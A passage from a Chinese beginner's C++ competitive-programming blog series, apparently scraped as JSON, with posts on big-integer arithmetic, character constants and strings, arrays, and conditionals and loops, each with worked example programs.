类型的最大值。 我们要使用一些奇怪的东西，来储存它，比如说——字符串。 前面我们有说过，string类型没有长度限制，那我们可以怎么操作呢？ 思路 通用的思路，我们来模拟一下如何进行加法运算。 我们可以知道，加法可能会有进位。 那进位能不能判断还不好说（很麻烦），所以我们考虑在数组中逆序存储，这样如果有进位会在结果的后面存储，最后输出时再 逆序输出 ，就实现了存储。 为了方便，我建议大家把数组的每一位设置为0，可能会方便些。 比如说，我们要计算 123+4567123 + 4567123+4567 。首先从用户那里输入进来，我们的字符串 s1s1s1、s2s2s2 的内容分别为 123123123、567567567。逆序存入数组储存： 然后，从0开始，遍历长度较长的数组，加法运算。 接下来，处理进位，逢十进一，当前的位取个位，后面的一位增加 111 。 从第 nnn 位倒着往回遍历，遇到第一个不是0的数时，就开始输出，得到 469046904690 。 哈哈哈，惊不惊喜，意不意外？ 加法的代码实现 如下是刚才我手写的程序，大家可以看看； // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; // 用户输入的字符串 string s1,s2; // a储存逆序s1，b储存逆序s2，c储存结果（考虑到进位，为了保证不会越界，开502的长度） int a[501],b[501],c[502]; int main(){ cin&gt;&gt;s1&gt;&gt;s2; // 逆序存入数组 for(int i=0;i&lt;s1.size();i++) a[i]=s1[s1.size()-i-1]-'0'; for(int i=0;i&lt;s2.size();i++) b[i]=s2[s2.size()-i-1]-'0'; // 加法计算 int maxlen=max(s1.size(),s2.size()); // 获取较长的长度 for(int i=0;i&lt;maxlen;i++){ c[i]+=a[i]+b[i]; // 处理进位，不进位也不会受到影响 c[i+1]+=c[i]/10, // 如果不进位，就不会加 c[i]%=10; // 只取个位 } // 获取第一个不是0的数 bool flag=false; // 标记是否找到第一个不是0的数 for(int i=maxlen+1;i&gt;=0;i--){ if(c[i]||flag) flag=true; // 如果后面的一位不是0，就找到了第一个不是0的数；或者是已经找到了不是0的数，后面有0 if(flag) cout&lt;&lt;c[i]; // 如果已经找到了第一个不是0的数，就连续地输出 } if(flag==false) cout&lt;&lt;0; // 如果到最后一位也没找到不是0的数，结果是0 return 0; } 附上我以前初学时写的程序（可能过不了这个题，但是也是高精度），还是比较简单的： // Author:PanDaoxi #include &lt;iostream&gt; using namespace std; int main(){ // 高精度加法 240位内 int a[241]={},b[241]={},result[242]={},x=0,y=0; string c,d; cin&gt;&gt;c&gt;&gt;d; // 第一步读取整数 for(int i=c.size()-1;i&gt;=0;i--){ a[x++]=c[i]-'0'; } for(int i=d.size()-1;i&gt;=0;i--){ b[y++]=d[i]-'0'; } // 第二步加法计算 for(int i=0;i&lt;(x&gt;y?x:y);i++){ result[i]+=(a[i]+b[i])%10; result[i+1]+=(a[i]+b[i])/10; } for(int i=(x&gt;y?x:y);i&gt;=0;i--){ cout&lt;&lt;result[i]; } return 0; } 减法 减法和加法的算法差不太多，可以这样，你看，我们计算 123−45123-45123−45，可以这样： 我们借一当十，模拟： 例如下标为0的地方，可以这样计算： 10−5=55+3=810-5=5\\\\ 5+3=8 10−5=55+3=8 OK，那就正常写呗： // Author:PanDaoxi #include &lt;iostream&gt; using namespace std; int main(){ string s1,s2; int a[241]={},b[241]={},result[241]={},k=0,t; cin&gt;&gt;s1&gt;&gt;s2; // 考虑几种特殊情况 if(s1==s2){ // 相等 cout&lt;&lt;0; return 0; } // 后面的比前面的长，需要输出负号 if(s1.size()&lt;s2.size()||s1.size()==s2.size()&amp;&amp;s1&lt;s2){ cout&lt;&lt;&quot;-&quot;; swap(s1,s2); } // 存储数据 for(int i=0;i&lt;s1.size();i++){ a[s1.size()-i-1]=s1[i]-'0'; } for(int i=0;i&lt;s2.size();i++){ b[s2.size()-i-1]=s2[i]-'0'; } // 模拟竖式的算法 for(int i=0;i&lt;(s1.size()&gt;s2.size()?s1.size():s2.size());i++){ t=10-b[i]+a[i]+result[k++]; if(t&lt;10) result[k]--; // 退位，在后面一位减去1 result[k-1]=t%10; } // 前面可能有0，从第一个不是0的数开始输出 for(int i=k-1;i&gt;=0;i--){ if(result[i]&gt;0){ t=i; // 记录第一个不是0的数的下标 break; } } // 输出 for(int i=t;i&gt;=0;i--){ cout&lt;&lt;result[i]; } return 0; } 乘法 这次，有点儿难度。 例题1： 例题2： 高精度乘单精度 高精度乘单精度，有个高级用法，即幂运算。 咳咳先别说那么多，该怎么算啊？？ 假设我们要计算 123×5123\\times5123×5 ，给定高精度数s1（123）和单精度n（5)，我们需要将高精度的每一位都乘上n，循环一遍；然后再处理进位。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n,a[501]={}; string s1; cin&gt;&gt;s1&gt;&gt;n; for(int i=0;i&lt;s1.size();i++) a[i]=s1[s1.size()-i-1]-'0'; for(int i=0;i&lt;s1.size()+5;i++){ // 按位相乘 a[i]*=n; } for(int i=0;i&lt;s1.size()+5;i++){ // 处理进位 a[i+1]+=a[i]/10,a[i]%=10; } // 输出 bool flag=false; for(int i=s1.size()+5;i&gt;=0;i--){ if(a[i]||flag) flag=true; if(flag) cout&lt;&lt;a[i]; } if(!flag) cout&lt;&lt;0; return 0; } 我初学的时候这么写的： // Author:PanDaoxi #include &lt;iostream&gt; using namespace std; int main(){ // 高精度乘单精度（不超过10000） int a[251]={}; string s1; int b; cin&gt;&gt;s1&gt;&gt;b; for(int i=0;i&lt;s1.size();i++){ a[i]=s1[s1.size()-i-1]-'0'; } // 按位相乘 for(int i=0;i&lt;s1.size();i++){ a[i]=a[i]*b; } // 处理进位 for(int i=0;i&lt;s1.size()+4;i++){ if(a[i]&gt;=10){ a[i+1]+=a[i]/10; a[i]%=10; } } // 获取第一个不是0的数 int point=0; for(int i=s1.size()+4;i&gt;=0;i--){ if(a[i]!=0){ point=i; break; } } for(int i=point;i&gt;=0;i--){ cout&lt;&lt;a[i]; } return 0; } 高精度乘高精度 这个部分比较难，计算高精度数s1s1s1、s2s2s2的乘积，即123×456123\\times456123×456 按照正常的竖式计算法，我们应该用一个数去乘另一个数的每一位（单精度），所以我们需要双重循环。 // AUTHOR:PANDAOXI #include &lt;iostream&gt; using namespace std; int main(){ string s1,s2; int a[4002]={},b[4002]={},result[8004]={}; cin&gt;&gt;s1&gt;&gt;s2; for(int i=0;i&lt;s1.size();i++) a[i]=s1[s1.size()-i-1]-'0'; for(int i=0;i&lt;s2.size();i++) b[i]=s2[s2.size()-i-1]-'0'; for(int i=0;i&lt;s1.size();i++){ for(int j=0;j&lt;s2.size();j++){ result[i+j]+=a[i]*b[j]; result[i+j+1]+=result[i+j]/10, result[i+j]%=10; } } int p=0; for(int i=s1.size()+s2.size()-1;i&gt;=0;i--){ if(result[i]&gt;0){ p=i;break; } } for(int i=p;i&gt;=0;i--){ cout&lt;&lt;result[i]; } return 0; } 解例题 第一题，我们可以使用高精度乘单精度，单精度即2，高精度即2的幂。 // Author:PanDaoxi #include &lt;iostream&gt; using namespace std; int main(){ // 2的0次方=1 int a[501]={1},len=1,p,n; // len=1,记录长度 cin&gt;&gt;n; for(int i=0;i&lt;n;i++){ // 乘n次2 // 按位相乘 for(int j=0;j&lt;len;j++){ a[j]*=2; } // 处理进位 for(int j=0;j&lt;len;j++){ a[j+1]+=a[j]/10; a[j]%=10; } // 如果后面有个数，长度就要增加了 if(a[len]&gt;0) len++; } // 输出 for(int i=len;i&gt;=0;i--){ if(a[i]&gt;0){ p=i; break; } } for(int i=p;i&gt;=0;i--){ cout&lt;&lt;a[i]; } return 0; } 说实话这个题根本用不着高精度，只是看着像，用高精度也能解。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n; cin&gt;&gt;n; cout&lt;&lt;(1&lt;&lt;n); // 左移一位（位运算） return 0; } 例题二也不难，高精度乘高精度，直接套程序。注意观察数据范围。 高精度除法 计算a÷ba{\\div} ba÷b（保留n位小数）。大家可以找找规律。 // Author:PanDaoxi #include &lt;iostream&gt; using namespace std; int main(){ int a,b,n,t=0,c[1001]; cin&gt;&gt;a&gt;&gt;b&gt;&gt;n; // 输出小数点 cout&lt;&lt;a/b&lt;&lt;&quot;.&quot;; a=(a%b)*10; // 计算小数点后的数 for(int i=0;i&lt;n;i++){ c[t++]=a/b; a=(a%b)*10; // 当10，再算 } // 输出 for(int i=0;i&lt;t;i++){ cout&lt;&lt;c[i]; } return 0; } 关于打表 其实，告诉大家个坏消息，python自带高精度，C++就得手写…… 例如这道题： 在竞赛中，Python可以当做工具使用，但不能作为程序提交。所以，我们可以结合Python（或其他语言、程序），把得到的结果储存在字符串数组中，这种行为就是打表。 打表虽然不讲武德，但是也有很多好处，我们要善于利用工具😅，尽管这可能对我们的学习好处并不很大。 这是表的生成器。 # Author:PanDaoxi result = &quot;&quot; for i in range(0,50): s, d = 0, 1 for i in range(1, i+1): d *= i s += d result += &quot;\\&quot;&quot; + str(s) + &quot;\\&quot;,&quot; with open(&quot;test.txt&quot;, &quot;w&quot;, encoding=&quot;utf-8&quot;) as f: f.write(result) 运行后，生成test.txt，里面的内容放到字符串数组里，输入n，然后直接从数组里输出下标。多香啊！！ 建议在提交题目时，把生成器写到注释里。 // Author:PanDaoxi #include &lt;iostream&gt; using namespace std; int main(){ string s[51]={&quot;0&quot;,&quot;1&quot;,&quot;3&quot;,&quot;9&quot;,&quot;33&quot;,&quot;153&quot;,&quot;873&quot;,&quot;5913&quot;,&quot;46233&quot;,&quot;409113&quot;,&quot;4037913&quot;,&quot;43954713&quot;,&quot;522956313&quot;,&quot;6749977113&quot;,&quot;93928268313&quot;,&quot;1401602636313&quot;,&quot;22324392524313&quot;,&quot;378011820620313&quot;,&quot;6780385526348313&quot;,&quot;128425485935180313&quot;,&quot;2561327494111820313&quot;,&quot;53652269665821260313&quot;,&quot;1177652997443428940313&quot;,&quot;27029669736328405580313&quot;,&quot;647478071469567844940313&quot;,&quot;16158688114800553828940313&quot;,&quot;419450149241406189412940313&quot;,&quot;11308319599659758350180940313&quot;,&quot;316196664211373618851684940313&quot;,&quot;9157958657951075573395300940313&quot;,&quot;274410818470142134209703780940313&quot;,&quot;8497249472648064951935266660940313&quot;,&quot;271628086406341595119153278820940313&quot;,&quot;8954945705218228090637347680100940313&quot;,&quot;304187744744822368938255957323620940313&quot;,&quot;10637335711130967298604907294846820940313&quot;,&quot;382630662501032184766604355445682020940313&quot;,&quot;14146383753727377231082583937026584420940313&quot;,&quot;537169001220328488991089808037100875620940313&quot;,&quot;20935051082417771847631371547939998232420940313&quot;,&quot;836850334330315506193242641144055892504420940313&quot;,&quot;34289376947494122614363304694584807557656420940313&quot;,&quot;1439295494700374021157505910939096377494040420940313&quot;,&quot;61854558558074209658512637979453093884758552420940313&quot;,&quot;2720126133346522977702138448994068984204397080420940313&quot;,&quot;122342346998826717539665299944651784048588130840420940313&quot;,&quot;5624964506810915667389970728744906677010239883800420940313&quot;,&quot;264248206017979096310354325882356886646207872272920420940313&quot;,&quot;12678163798554051767172643373255731925167694226950680420940313&quot;,&quot;620960027832821612639424806694551108812720525606160920420940313&quot;,}; int n; cin&gt;&gt;n; cout&lt;&lt;s[n]; return 0; } 呵呵，羡慕吗？可惜竞赛不支持Python！ ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"五、练习：高精度","feature":"https://daoxi365.github.io/tech-blog//post-images/gao-jing-du-practice.png","link":"https://daoxi365.github.io/tech-blog/gao-jing-du-practice/","stats":{"text":"14 min read","time":825000,"words":2959,"minutes":14},"date":"2022-08-06 10:27:06","dateFormat":"2022-08-06"},{"content":" 气死我了，我刚才写了半天的文章，浏览器一个闪退全给我毁了！！ 字符常量 什么是字符常量？跟字符串有什么关系？好问题。 这玩意儿，曾经把我心态整崩过。 在讲字符常量以前，我们先说说 ASCII 表。 什么叫 ASCII ？ —— ASCII (American Standard Code for Information Interchange)：美国信息交换标准代码是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准 ISO/IEC 646。ASCII第一次以规范标准的类型发表是在1967年，最后一次更新则是在1986年，到目前为止共定义了128个字符。 总之，在信息学竞赛的范围内，你能用上的地方就是 整数类型 与 字符常量 的互相转化。 今天，我们将认识一位新朋友 —— char类型，它可以表示 ASCII 表中的单个字符。 众所周知，在计算机的视野内只有数字，一切都是建立在数字的基础上的。更进一步说，其实计算机啥也不会，只知道有电（1）还是没电（0），这样形成了二进制。你看，在 ASCII 表中，有10进制的数码对应字符，我们就可以使用强制类型转换将其转化为char类型，也可以用char类型转为int 类型。 // 转换为整数 char s='A'; // 字符常量要使用单引号括起来 int a=s; cout&lt;&lt;a&lt;&lt;&quot; &quot;; // 65 cout&lt;&lt;int(s)&lt;&lt;endl; // 等同于这种方式 // 转换为字符 int b=97; char d=b; cout&lt;&lt;d&lt;&lt;&quot; &quot;; cout&lt;&lt;char(b); 如果我们想知道从A开始的第n个字母，可以这样做： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n; cin&gt;&gt;n; cout&lt;&lt;'A'+n; return 0; } 根据我们刚才所介绍的知识，来做两个题： Luogu B2018 Luogu B2017 简简单单，自己试试吧！😁 拓展：控制字符 大家看， ASCII 表上的前几个都是控制字符。比如 8号是回退（Backspace）、9号是制表（Tab），10号是换行。 对于回退，大家可以尝试按下键盘上的insert感受，回退到前面的字符时，再次输入，后来的字符会代替前面的字符。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ cout&lt;&lt;&quot;a&quot;; //正常的输出 cout&lt;&lt;char(8); //回退 cout&lt;&lt;&quot;b&quot;; //盖住a return 0; } 制表符相当于\\t，换行符相当于\\n。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ cout&lt;&lt;&quot;a&quot;; //正常的输出 cout&lt;&lt;char(9); //制表符 cout&lt;&lt;&quot;b&quot;; //正常的输出 cout&lt;&lt;char(10);//换行符 cout&lt;&lt;&quot;c&quot;; cout&lt;&lt;char(9); cout&lt;&lt;&quot;d&quot;; return 0; } 更多的知识等待大家去探索。 字符串——字符数组 字符数组，顾名思义，就是由我们刚才的 ASCII 字符组成的数组。当然上面说的 ASCII 只是常规 ASCII ，有亿些特殊符号在扩展 ASCII 中。 我们可以这样定义一个字符数组： char s[15]={&quot;Hello,World!&quot;} 上面这个字符数组里面储存了字符串Hello,World!。 使用字符数组还需要注意一点，即我们给字符数组开长度时要足够大，例如上面的字符串s，单纯可见字符的数量为12个，但是在开长度时至少要开13，原因是末尾有一个不可见的控制字符\\0，也占一个长度。 关于字符数组更多的内容，可以参考我搜集的学习资料。 字符串——string string类型是 STLSTLSTL 提供的字符串类，而字符数组本质上是一种数组，有长度限制；string没有长度限制！ 定义方法： string 变量名=&quot;字符串内容&quot;; 更多使用方法，可以看我搜集的学习资料。 ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"四、字符常量 & 字符串","feature":"https://daoxi365.github.io/tech-blog//post-images/string-and-const-char-oi.png","link":"https://daoxi365.github.io/tech-blog/string-and-const-char-oi/","stats":{"text":"5 min read","time":241000,"words":1018,"minutes":5},"date":"2022-08-02 19:54:00","dateFormat":"2022-08-02"},{"content":"数组 数组是啥？ 数组是干嘛的？ 数组怎么用？ 不管咋样，先看百科了解亿下： C++ 数组 —— 菜鸟教程 C++ 支持数组数据结构，它可以存储一个固定大小的相同类型元素的顺序集合。数组是用来存储一系列数据，但它往往被认为是一系列相同类型的变量。 数组的声明并不是声明一个个单独的变量，比如 number0、number1、...、number99，而是声明一个数组变量，比如 numbers，然后使用 numbers[0]、numbers[1]、...、numbers[99] 来代表一个个单独的变量。数组中的特定元素可以通过索引访问。 所有的数组都是由连续的内存位置组成。最低的地址对应第一个元素，最高的地址对应最后一个元素。 这都是啥跟啥啊？！ 数组 array是C++等编程语言里重要的数据结构，后期我们将学 栈stack、队列queue等。 同时，C++里面的vector与Python里面的list差不多，array、list的下标都是从0开始的。为了方便我们后期可能会使用 STLSTLSTL 大法！ 别的先别说了，开搞吧！ 数组也有数据类型，比如有整数型的、长整数型的、浮点型的等等，其中的字符数组就是字符串的一种。 定义方法： 数据类型 数组名[数组长度]={数组内容}; 我建议大家在定义数组时定义在main函数外面，这样一是方便其他函数使用，二是这样写可以给数组的每个元素赋值为0（变量的值也是0）。 在主函数内定义，这种数组就成为了局部变量，而且用不到的元素C++默认为随机数，有可能你找半天bug也找不到…… 要是给一个数组的每一个元素快速赋值，可以使用memset函数，就像这样： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int a[101]; // 初始化 memset(a,-1,sizeof(a)); // 等同于 int a[101]={}; // 输出 for(int i=0;i&lt;101;i++){ cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; } return 0; } 那么，给你出一道题： 请你输出正整数 nnn 各个数位上的数。 输入：1234 输出：1 2 3 4 哈哈，可惜你没学过字符串，不然轻轻松松就给秒了。 我们可以使用数组储存每一位的数字，然后再输出。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int n,m,a[101],k; int main(){ cin&gt;&gt;n; while(n) a[k++]=n%10,n/=10; // 倒着输出 for(int i=k-1;i&gt;=0;i--){ cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; } return 0; } 你要是再厉害一点儿呢，可以这么写： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int n,m,a[101],k; int main(){ cin&gt;&gt;n; while(n) a[k++]=n%10,n/=10; // 获取每一位上的数字 // 先把每一位的数字变成正确的顺序 for(int i=0;i&lt;k/2;i++){ // 交换两个变量的值 // swap(a[i],a[k-i-1]); // swap可以交换两个变量的值 // 临时变量法 m=a[i],a[i]=a[k-i-1],a[k-i-1]=m; } for(int i=0;i&lt;k;i++){ cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; } return 0; } 这是个数学原理。要获取 aaa 每一位上的数字，可以这么干： a mod 10（获取最后一位的数字）⟹⌊a÷10⌋（a缩小到原来的110）a\\ mod\\ 10（ 获取最后一位的数字）\\Longrightarrow \\left \\lfloor a{\\div} 10 \\right \\rfloor （a缩小到原来的\\frac{1}{10}） a mod 10（获取最后一位的数字）⟹⌊a÷10⌋（a缩小到原来的101​） 总之，任何强大的成绩，都建立在海量的刷题之上。 来做个俩题儿吧： 第一题不难，你应该已经有思路了吧？！ 很简单，用上刚刚的数组知识，解个这种题嘎嘎简单！ //Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n,a[101],k=0; while(cin&gt;&gt;n){ a[k++]=n; } for(int i=k-1;i&gt;=0;i--){ if(a[i]==0) continue; cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; } return 0; } 后面这个也不难，掌握方法就行。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n,a[101],b[101],k=0; cin&gt;&gt;n; for(int i=0;i&lt;n;i++){ cin&gt;&gt;a[i]; } for(int i=n-1;i&gt;=0;i--){ int x=0; for(int j=i;j&gt;=0;j--){ if(a[j]&lt;a[i]) x++; } b[k++]=x; } for(int i=k-1;i&gt;=0;i--){ cout&lt;&lt;b[i]&lt;&lt;&quot; &quot;; } return 0; } 以下内容为作死，慎重使用 P1427 这个题官方给出的算法标签是递归和栈🤣，倒也不是不行，不过很有趣。 拓展：考试的时候，测题机会在末尾加上 ctrl+z 退出，所以我们可以利用这一特性来做题。因为这个键（^Z=ctrl+z）能终止死循环，所以我们只需要在输入时判断是否为这个键就行了；而这个键的bool值为假，所以输入时就会自动判断了。 模拟法： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int a[101]={},k=0; while(cin&gt;&gt;a[k++]); // 输入数据 // 如果不是0就输出 for(int i=k-2;i&gt;=0;i--) if(a[i]!=0) cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; return 0; } 递归法： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int x; void f(int k){ if(k==0) return; cin&gt;&gt;x; f(x); cout&lt;&lt;k&lt;&lt;&quot; &quot;; } int main(){ cin&gt;&gt;x; f(x); return 0; } 栈法： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ stack&lt;int&gt; st; int n,m; while(cin&gt;&gt;n){ st.push(n); } while(!st.empty()){ m=st.top(); if(m!=0) cout&lt;&lt;m&lt;&lt;&quot; &quot;; st.pop(); } return 0; } ","tags":[{"index":2,"name":"OI 从入门到出门","slug":"oier-yyds","used":true,"link":"https://daoxi365.github.io/tech-blog/oier-yyds/"},{"index":-1,"name":"OI 系列","slug":"oi","used":true,"link":"https://daoxi365.github.io/tech-blog/oi/"}],"title":"三、数组","feature":"https://daoxi365.github.io/tech-blog//post-images/shu-zu-oi.png","link":"https://daoxi365.github.io/tech-blog/shu-zu-oi/","stats":{"text":"7 min read","time":375000,"words":1419,"minutes":7},"date":"2022-07-31 14:44:00","dateFormat":"2022-07-31"},{"content":"布尔类型 hello，我们又见面了，在开始今天的内容之前，我们来看一点点有趣的东西——布尔类型（bool）。 定义的方法： bool 变量名=真（true）或假（false）; 比如说：bool flag=true;，定义布尔变量时，不给默认值则该变量为假。 我们也可以直接把布尔类型的变量定义为表达式，它会自动运算结果，并决定变量的值的真假。 例如：bool flag=(100&gt;99);，这里的变量的值为真；重新定义flag=(100&lt;99);，这时变量的值为假。 需要注意的是： 除了0以外的其他任何数字的布尔值为真，只有0为假。同样的，空字符常量的布尔值为0。 任何逻辑表达式的结果都可以归结为真或假，即布尔类型的变量。 当你想要给一个布尔类型的变量取反值时，你可以巧妙地使用取反符，比如这样： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ bool s=false; s=!s; cout&lt;&lt;s; return 0; } 或者这样： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ bool s=false; s=not s; cout&lt;&lt;s; return 0; } 判断 判断，想必大家都不陌生。在大多数语言里面，判断用的语句叫 if 语句，Python与C++也有许多相似之处。 例如，在python里，if是这么写的： if something: # put your code here pass elif something: # put your code here pass else: # put your code here pass 而C++要这么写： if(something){ // your code ; } else if(something){ // your code ; } else{ // your code ; } 当if语句小括号内的布尔值为真的话，就会执行对应大括号内的指令，即程序中something的 C++与Python的逻辑运算符也有些许不同，如下表： Python C++ 语义 特点 and &amp;&amp; 逻辑与 一假则假 or || 逻辑或 一真则真 not not 取反 真假互换 在目前的阶段，我们只会在逻辑表达式中使用这些逻辑运算符，在非布尔值的表达式中运用这些符号，不会得到布尔类型的值。 两种语言中逻辑运算符的用法差不太多，例如python中a and b，在C++里边表示为a&amp;&amp;b。 现在我们再来说说判断运算符： Python C++ 语义 示例 == == 等于（===） 100==100 返回真；100==99 返回假 != != 不等于（≠\\ne​=） 123!=345 返回真；123!=123 返回假 &lt; &lt; 小于（&lt;&lt;&lt;） 1&lt;2 返回真；1&lt;0 返回假 &gt; &gt; 大于（&gt;&gt;&gt;） 3&gt;2 返回真；3&gt;4 返回假 &lt;= &lt;= 小于等于（≤\\le≤） 1&lt;=1 返回真；2&lt;=1 返回假 &gt;= &gt;= 大于等于（≥\\ge≥） 1&gt;=0 返回真；1&gt;=2 返回假 一起来试试吧： 显而易见，我们只需要用一个if和一个else就可以了~ 如果你的代码是这样的，就说明你已经掌握了一部分的判断语句😁 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n; cin&gt;&gt;n; // if后只有一句可以不用加大括号。 if(n&gt;=10&amp;&amp;n&lt;=99) cout&lt;&lt;1; else cout&lt;&lt;0; return 0; } 当然，我们可以妙用除法： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n; cin&gt;&gt;n; if(n/10&gt;=1&amp;&amp;n/10&lt;=9) cout&lt;&lt;1; else cout&lt;&lt;0; return 0; } 既然这题没啥问题了，就再来一题吧！😄 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int n; cin&gt;&gt;n; // 对15取余为0 相当于 被15整除 if(n%15==0) cout&lt;&lt;&quot;YES&quot;; else cout&lt;&lt;&quot;NO&quot;; return 0; } 哇，你好厉害啊！现在，我们来继续增大难度，看一个有趣的东西——三目运算符。 三目运算符 三目运算符的基本结构是： (表达式或布尔值) ? 真值要做的事 : 假值要做的事 例如：(a&gt;b)?b=a:a=b，给出整数 aaa 和 bbb ，那么请问这是在干嘛呢？ 表达式的意思是在说： 如果 a&gt;ba&gt;ba&gt;b 成立，就把 aaa 的值赋给 bbb ；反之就把 bbb 的值给 aaa 。 如何利用三目运算符比较三个数中最大的呢？ ((a&gt;b)?((a&gt;c)?a:((b&gt;c)?b:c)):((b&gt;c)?b:c)) 看起来很麻烦的样子，我们来仔细理解一下😅。 先比较 a 和 b 的大小，如果 b 大，就用 c 和 b 作比较，如果 b 大，b 就是最大的那个；如果最开始 a 大，就用 a 和 c 作比较，如果 a 大， a 就是最大的，如果 c 大，那再拿 b 和 c 作比较，拿到最大的。 好家伙，这么麻烦啊？？ 不过好在，我们有函数来帮忙。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int a,b,c; cin&gt;&gt;a&gt;&gt;b&gt;&gt;c; // cout&lt;&lt;((a&gt;b)?((a&gt;c)?a:((b&gt;c)?b:c)):((b&gt;c)?b:c)); cout&lt;&lt;max(max(a,b),c); return 0; } 好啦好啦，接下来我们来放松一下，来看看循环…… 三种循环 在讲循环以前，我们要先来学一点点操作符号，方便大家理解！ 这方面Python和C++的差别并不太大，你看： （假设我们有一个整数类型的变量 a=10a=10a=10 ） Python C++ 含义 运行结果 返回值 a+=1 a++ a的值增加1 11 a a-=1 a-- a的值减少1 9 a a+=1 ++a a的值增加1 11 a+1 a-=1 --a a的值减少1 9 a-1 a+=10 a+=10 a的值增加10 20 a+10 a-=10 a-=10 a的值减少10 0 a-10 a*=5 a*=5 a的值乘5 50 a*5 a/=5 a/=5 a的值除以5 2 a/5 a%=3 a%=3 a的值对三取余 1 a%3 当然不排除，大家是不是见过a++和++a？有何区别？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int a=10; cout&lt;&lt;(a++)&lt;&lt;endl; a=10; cout&lt;&lt;(++a)&lt;&lt;endl; return 0; } 可见输出的结果为：10 11。 a++ 为先输出、再加，但是因为下面重新给a赋值为10，所以看不到效果；但是重新赋值以前 a 的值已经是11了。 ++a 为先加再输出。 现在，我们来看看第一种循环：while循环。 while 循环 while循环，我们在python里经常见吧？！ 格式是差不多的： while(表达式或布尔类型的值){ 你要执行的指令 } 当表达式的值为假时，循环停止，继续运行下面的指令。 但如果你写成了 while(true) （死循环），就会一直跑，跑啊跑，至死方休。 看一个简单的小例子，输出1~100的数： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=1; // 给定初始值为1 while(index&lt;=100){ // 当 index=101 时，不满足条件，就退出了 cout&lt;&lt;index++&lt;&lt;&quot; &quot;; // 先输出，再增加 } cout&lt;&lt;endl&lt;&lt;endl&lt;&lt;&quot;继续执行后面的指令。&quot;&lt;&lt;endl; cout&lt;&lt;&quot;循环过后 index=&quot;&lt;&lt;index; return 0; } 可以看到，循环过后的指令也被执行了。当index的值超过100后，循环就不满足条件，继续执行循环过后的指令了。 continue 那么，我们想，如何跳过50继续循环呢？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=0; while(index&lt;100){ // 要先增加，然后在判断是否为50，这样既保证了index增加，又确保能够跳过50。 if((++index)==50) continue; // 遇到50就跳过，继续循环 cout&lt;&lt;index&lt;&lt;&quot; &quot;; } return 0; } 继续看，如果我们想要跳过3的倍数呢？ // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=1; while(index&lt;=100){ if(index++%3==0) continue; cout&lt;&lt;index-1&lt;&lt;&quot; &quot;; // 因为过早地加上了，还需要减掉1 } return 0; } 那么请你来分析一下这个程序的错误原因吧： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=1; while(index&lt;=100){ if(index%5==0) continue; // 跳过5的倍数 cout&lt;&lt;index&lt;&lt;&quot; &quot;; index++; } return 0; } 程序为什么只输出了 1 2 3 4 然后就不动了？ 答：我们在考虑问题时一定要周全，当第四次循环完成，这时 index=5，第五次循环刚刚开始遇到 continue 语句，跳了过去；第六次循环，index没有增加，所以index的值还是5，遇到 continue 跳了过去，形成了死循环。 如何修改？只需要让跳过的时候，index的值也增加1。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=1; while(index&lt;=100){ if(index%5==0) index++; cout&lt;&lt;index&lt;&lt;&quot; &quot;; index++; } return 0; } break break，打破循环。 // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ int index=1; while(index&lt;=100){ // 当index的值为50时，终止循环。 if(index==50) break; cout&lt;&lt;index++&lt;&lt;&quot; &quot;; } return 0; } 所以只输出到49，程序就结束了。 break语句比较简单，还有一个switch语句也用break，但是用得不多，比if繁琐得多，我就不多说了。 do-while循环 这个循环和while其实很像，但是有一点一定要注意：不管while内是真是假，do内的指令都会执行。 例如： // Author:PanDaoxi #include &lt;bits/stdc++.h&gt; using namespace std; int main(){ do{ cout&lt;&lt;&quot;hi&quot;; }while(false); return 0; } 可以这样输出1~100： // Author:PanDaoxi #include 